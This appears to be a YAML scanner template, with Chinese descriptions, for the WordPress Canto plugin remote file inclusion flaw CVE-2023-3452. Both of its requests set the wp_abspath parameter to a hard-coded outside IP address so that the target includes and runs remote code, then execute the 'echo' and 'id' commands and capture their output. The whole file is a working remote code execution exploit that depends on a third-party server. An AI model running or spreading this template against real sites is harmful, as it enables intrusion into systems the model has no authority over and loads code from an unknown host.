name: "WordPress Canto Plugin RFI/RCE (CVE-2023-3452)"
description: "WordPress Canto插件3.0.5之前版本存在远程文件包含漏洞，攻击者可通过wp_abspath参数包含并执行任意远程代码，实现远程代码执行。该漏洞影响download.php文件中对wp_abspath参数的不当处理。"
severity: "critical"
references:
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-3452"
  - "https://wordpress.org/plugins/canto/"

requests:
  - steps:
      # 第一步：检测漏洞是否存在，通过执行echo命令验证RFI和RCE
      - method: "GET"
        path: "/wp-content/plugins/canto/includes/lib/download.php"
        headers:
          User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        query:
          wp_abspath: "http://39.98.204.142:85/"
          cmd: "echo 'RFI_TEST_SUCCESS'"
        matchers:
          - type: "word"
            words: ["RFI_TEST_SUCCESS"]
            condition: "and"

          - type: "status"
            status: [200, 500]
        extractors:
          - type: "regex"
            name: "response_content"
            regex: ["(.*)"]
            group: 1

  - post:
      # 第二步：执行命令验证RCE
      - method: "GET"
        path: "/wp-content/plugins/canto/includes/lib/download.php"
        headers:
          User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        query:
          wp_abspath: "http://39.98.204.142:85/"
          cmd: "id"
        matchers:
          - type: "word"
            words: ["uid=", "gid="]
            condition: "and"
          - type: "status"
            status: [200]
        extractors:
          - type: "regex"
            name: "command_output"
            regex: ["uid=([0-9]+).*gid=([0-9]+)"]
            group: 0
